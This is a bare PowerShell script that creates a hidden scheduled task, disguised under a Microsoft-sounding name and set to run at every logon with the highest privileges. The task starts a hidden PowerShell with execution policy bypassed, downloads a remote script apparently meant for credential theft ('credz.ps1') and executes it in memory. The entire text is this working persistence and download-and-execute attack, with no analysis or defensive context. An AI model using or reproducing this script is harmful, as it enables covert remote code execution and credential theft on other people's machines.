$action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/skekic16/lol/raw/main/credz.ps1?dl=1; invoke-expression $pl'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
Register-ScheduledTask T1 -InputObject $task -Force -TaskName MicrosoftCleanhouse -User $env:UserName
